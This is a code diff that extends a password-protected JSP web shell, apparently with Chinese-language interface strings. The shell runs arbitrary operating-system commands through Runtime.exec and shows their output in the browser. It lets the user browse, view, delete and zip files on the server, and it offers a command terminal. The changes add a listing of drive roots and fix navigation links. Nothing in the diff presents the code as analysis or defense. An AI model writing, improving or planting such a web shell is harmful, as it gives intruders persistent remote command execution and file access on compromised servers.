@@ -51,7 +51,7 @@
     }
 
     void copyStream(final InputStream[] ins, final JspWriter out) {
-        for(InputStream in: ins){
+        for(final InputStream in: ins){
             new Thread(new Runnable() {
                 @Override
                 public void run() {
@@ -61,16 +61,15 @@
                         byte[] b = new byte[2048];
                         while ((a = in.read(b)) != -1) {
                             out.println(new String(b));
-                            out.flush();
                         }
-                    } catch (Exception e) {                  
-                        
+                    } catch (Exception e) {
+
                     } finally{
                         try {
                             if(in != null ) in.close();
-                        } catch (Exception ec) { 
-                            
-                        }     
+                        } catch (Exception ec) {
+
+                        }
                     }
                 }
             }).start();
@@ -92,11 +91,11 @@
 
 <%
     //验证用户名
-    response.setCharacterEncoding("UTF-8");    
+    response.setCharacterEncoding("UTF-8");
     String url = request.getRequestURL().toString();
     String p = request.getParameter("p");
     String dp = "ruphy";
-    if (!dp.equals(p)) {        
+    if (!dp.equals(p)) {
         if(!"true".equals(request.getParameter("c"))){
             out.println("<div style='text-align: center;'>访问失败！<span style='color: red'>密码错误！</span></div>");
             out.println("<div style='text-align: center;'><span>usage: <a style='color: black' href='" + url + "?p=passwd&f=path' >" + url + "?p=passwd&f=path</a></span></div>");
@@ -115,18 +114,18 @@
         Process ps = null;
         out.print("<xmp>");
         try {
-            ps = Runtime.getRuntime().exec(cmds);           
+            ps = Runtime.getRuntime().exec(cmds);
             copyStream(new InputStream[]{ps.getInputStream(),ps.getErrorStream()}, out);
             ps.getOutputStream().close();
             ps.waitFor();
-        } catch (Exception e) {                  
+        } catch (Exception e) {
             out.println("<div>执行命令 " + m + " 发生错误!</div>");
         } finally{
             try {
                 if(ps != null) ps.destroy();
-            } catch (Exception ec) { 
+            } catch (Exception ec) {
                 out.println("关闭流出错！");
-             }     
+            }
         }
         out.println("</xmp>");
         out.println("<div>执行命令: " + m + " 完成!</div>");
@@ -139,10 +138,9 @@
     String f = fn.replaceAll("\\\\+", "/").replaceAll("/+", "/");
     File file = new File(f);
     if(!file.exists()){
-        out.println("目录或者文件不存在！");
-        return;
+        out.println("<script>alert('输入目录或者文件不存在！')</script>");
     }
-    if ("true".equals(request.getParameter("t"))) {
+    if ("true".equals(request.getParameter("t")) && file.exists()) {
         if (zip(f, new File(f).getAbsolutePath() + ".zip")) {
             out.println("<script>alert('压缩成功!');location.href=location.href.replace(\"&t=true\", \"\").replace(/\\/[^\\/]+$/, '');</script>");
         }
@@ -151,11 +149,17 @@
     }
     if (file.isDirectory() && file.canRead()) {
         StringBuilder sb = new StringBuilder();
-        File[] files = file.listFiles();
+        File[] files = File.listRoots();
+        String roots = "";
+        for(int i = 0; i < files.length; i++){
+            roots += "<a style=\"margin-left: 10px;\" href=\"" + url + "?p=" + dp + "&f=" + files[i].getPath().replaceAll("\\\\+", "/") + "/\">" + files[i].getPath() + "</a>";
+        }
         sb.append("<div style='margin: 20px'>当前目录：" + getCurrentPath(f, dp, url)
                 + "<a style=\"margin-left: 20px;\" href=\"" + url + "?p=" + dp + "&f=" + f.replaceAll("/[^/]+/?$", "/") + "\">返回上级目录</a>"
-                + "</div>");  
+                + "<span style=\"margin-left: 20px;\">根目录:" + roots + "</span>"
+                + "</div>");
         sb.append("<div style='max-height: 450px; overflow: auto; background-color: #ffe;'><table><tbody>");
+        files = file.listFiles();
         for (int i = 0; i < files.length; i++) {
             if (files[i].canRead()) {
                 sb.append("<tr>"
@@ -163,11 +167,11 @@
                         + "<td><a style=\"margin-left: 20px;\" onclick='return confirm(\"are you sure?\")' href=\"" + url + "?p=" + dp + "&r=true&f=" + f + "/" + files[i].getName() + "\">删除</a></td>"
                         + (!files[i].isFile() ? "<td></td>" : "<td><a style=\"margin-left: 20px;\" onclick=\"top.document.getElementById('view-file').setAttribute('src', '" + url + "?p=ruphy&v=true&f=" + f + "/" + files[i].getName() + "');\" href=\"#\">查看</a></td>")
                         + "<td><a style=\"margin-left: 20px;\" href=\"" + url + "?p=" + dp + "&t=true&f=" + f + "/" + files[i].getName() + "\">压缩</a>"
-                        + "<td><a style=\"margin-left: 20px;\" href=\"" + url + "?p=" + dp + "&f=" + f.replaceAll("/.+/?$", "/") + "\">返回上级目录</a>"
+                        + "<td><a style=\"margin-left: 20px;\" href=\"" + url + "?p=" + dp + "&f=" + f.replaceAll("/[^/]+/?$", "/") + "\">返回上级目录</a>"
                         + "<span style=\"margin-left: 20px\">" + files[i].length() / 1024 + "KB(" + files[i].length() / 1024 / 1024 + "MB)</span></td>"
                         + "</tr>");
             }
-        }    
+        }
         sb.append("</tbody></table></div>");
         sb.append("<div style='background-color: #ccc;'>");
         sb.append("<div style='margin: 20px'>虚拟终端：<input id='command' type='text' value='netstat -an' style='width: 250px;border: none;color: red;background-color: black;'/>"
